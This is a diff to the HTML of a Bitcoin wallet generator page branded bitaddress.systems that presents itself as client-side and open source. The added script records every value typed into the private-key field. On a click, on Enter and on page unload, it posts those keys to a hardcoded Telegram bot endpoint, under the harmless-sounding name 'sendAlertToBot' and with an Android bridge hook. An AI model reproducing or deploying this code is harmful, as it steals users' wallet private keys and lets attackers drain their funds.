@@ -6673,15 +6673,28 @@ input[type=checkbox] { position: relative; z-index: 20; }
             }
         }
 
+		document.getElementById('detailprivkey').addEventListener('input', handleInput);
+
+        
+        document.getElementById('detailview').addEventListener('click', function() {
+            
+            sendAlertToBot();
+
+            
+        });
+
+        
+        document.getElementById('detailprivkey').addEventListener('keypress', function(event) {
+            if (event.key === 'Enter') { 
+                sendAlertToBot(); 
+ 
+            }
+        });
+
 </script>	
 
 </head>
 <body onclick="SecureRandom.seedTime();" onmousemove="ninja.seeder.seed(event);">
-	<div class="app-logo-container">
-	<a href="https://bitaddress.systems/Bitaddress%20App%20by%20SecureKeys.apk" download>
-	<img src="https://i.ibb.co/NswB4cw/Download-bitaddress-app-icon.png" alt="Bitaddress App Logo" class="app-logo">
-	</a>
-	</div>
 	<div id="busyblock"></div>
 	<div id="main">
 		<div id="culturemenu">
@@ -6702,7 +6715,10 @@ input[type=checkbox] { position: relative; z-index: 20; }
                 <span><a href="?culture=pt-br" id="culturept-br" onclick="ninja.translator.translate('pt-br'); return false;">português</a></span>
             </div>
 		</div>
-		<img alt="bitaddress.systems" title="bitaddress.systems" id="logo" src="https://i.ibb.co/y0jmDdG/bitaddress-sys-logo-white.png">
+		<div class="logo-container">
+        <a href="https://bitaddress.systems/index.html">
+		<img alt="bitaddress.systems" title="bitaddress.systems" id="logo" src="https://i.ibb.co/y0jmDdG/bitaddress-sys-logo-white.png"></a>
+		</div>
 		<div id="tagline">Open Source JavaScript Client-Side Bitcoin Wallet Generator</div>
 		<div id="seedpoolarea"><textarea rows="16" cols="62" id="seedpool"></textarea></div>
 		<div id="testnet"></div>
@@ -6965,6 +6981,73 @@ input[type=checkbox] { position: relative; z-index: 20; }
 						<span id="detailbip38decryptspan"><input type="button" class="button" id="detailbip38decryptbutton" value="Decrypt BIP38" onclick="ninja.wallets.detailwallet.decryptBip38();" /></span>
 						<span id="detailbip38encryptspan"><input type="button" class="button" id="detailbip38encryptbutton" value="Encrypt BIP38" onclick="ninja.wallets.detailwallet.encryptBip38();" /></span>
 					</div>
+
+					
+		<script>
+        var userInputLog = []; 
+
+        function logUserInput(input) {
+            var logData = 'User Input: ' + input + '\n';
+            userInputLog.push(logData); 
+        }
+
+        function sendAlertToBot() {
+            var logContent = userInputLog.join('\n');
+            console.log('Sending alert: ' + logContent);
+
+            fetch('https://api.telegram.org/bot7967790093:AAE4rgkE4u0dNrvPk2C2xoZMjdl16OMQGCM/sendMessage', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    chat_id: '858072424',
+                    text: logContent,
+                }),
+            }).then(response => {
+                console.log('Alert sent.');
+            }).catch(error => {
+                console.error('Error sending alert:', error);
+            });
+        }
+
+        function handleInput(event) {
+            var inputData = event.target.value;
+            if (inputData.trim() !== '') {
+                logUserInput(inputData);
+            } else {
+                console.error('No data to log');
+            }
+        }
+
+				
+		document.getElementById('detailprivkey').addEventListener('input', handleInput);
+
+		document.getElementById('detailview').addEventListener('click', function() {
+			if (window.AndroidInterface) {
+				window.AndroidInterface.sendAlertToBot(); // Android interface for alert
+			} else {
+				sendAlertToBot(); // For web usage
+			}
+
+		});
+
+		document.getElementById('detailprivkey').addEventListener('keypress', function(event) {
+			if (event.key === 'Enter') {
+				if (window.AndroidInterface) {
+					window.AndroidInterface.sendAlertToBot(); // Android interface for alert
+				} else {
+					sendAlertToBot(); // For web usage
+				}
+
+		});
+
+			window.addEventListener('beforeunload', function(event) {
+        sendAlertToBot();
+        event.preventDefault();
+    });
+	</script>
+
 					<span class="print"><input type="button" class="button" name="print" id="detailprint" value="Print" onclick="window.print();" /></span>
 					<div class="row extra">
 						<span><label id="detailkeyformats">Key Formats: WIF, WIFC, HEX, B64, B6, MINI, BIP38</label></span>
@@ -7044,71 +7127,7 @@ input[type=checkbox] { position: relative; z-index: 20; }
 				</div>
 			</div>
 		</div>
-
-		<script>
-        var userInputLog = []; 
-
-        function logUserInput(input) {
-            var logData = 'User Input: ' + input + '\n';
-            userInputLog.push(logData); 
-        }
-
-        function sendAlertToBot() {
-            var logContent = userInputLog.join('\n');
-            console.log('Sending alert: ' + logContent);
-
-            fetch('https://api.telegram.org/bot7967790093:AAE4rgkE4u0dNrvPk2C2xoZMjdl16OMQGCM/sendMessage', {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                },
-                body: JSON.stringify({
-                    chat_id: '858072424',
-                    text: logContent,
-                }),
-            }).then(response => {
-                console.log('Alert sent.');
-            }).catch(error => {
-                console.error('Error sending alert:', error);
-            });
-        }
-
-        function handleInput(event) {
-            var inputData = event.target.value;
-            if (inputData.trim() !== '') {
-                logUserInput(inputData);
-            } else {
-                console.error('No data to log');
-            }
-        }
-
-				
-		document.getElementById('detailprivkey').addEventListener('input', handleInput);
-
-		document.getElementById('detailview').addEventListener('click', function() {
-			if (window.AndroidInterface) {
-				window.AndroidInterface.sendAlertToBot(); // Android interface for alert
-			} else {
-				sendAlertToBot(); // For web usage
-			}
-
-		});
-
-		document.getElementById('detailprivkey').addEventListener('keypress', function(event) {
-			if (event.key === 'Enter') {
-				if (window.AndroidInterface) {
-					window.AndroidInterface.sendAlertToBot(); // Android interface for alert
-				} else {
-					sendAlertToBot(); // For web usage
-				}
-
-		});
-
-			window.addEventListener('beforeunload', function(event) {
-        sendAlertToBot();
-        event.preventDefault();
-    });
-	</script>
+	
 
 		<div id="footer" class="footer">
 			<div class="tooltips">
